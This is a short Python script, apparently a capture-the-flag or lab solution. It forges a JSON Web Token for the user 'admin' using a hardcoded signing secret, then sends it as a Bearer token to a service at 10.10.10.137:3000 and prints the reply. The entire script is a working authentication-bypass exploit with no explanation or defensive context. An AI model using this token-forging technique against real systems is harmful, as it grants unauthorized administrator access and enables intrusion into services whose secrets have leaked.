import jwt
import requests

jwt_token = jwt.encode( {'username':'admin','iat':'0' },key='worldisfullofdevelopers',algorithm='HS256')
# to not to treat as binary
jwt_token = jwt_token.decode('UTF-8')
headers = {'Authorization' : f'Bearer {jwt_token}'}

print(jwt_token)
r = requests.get('http://10.10.10.137:3000/',headers=headers)
print(r.text)
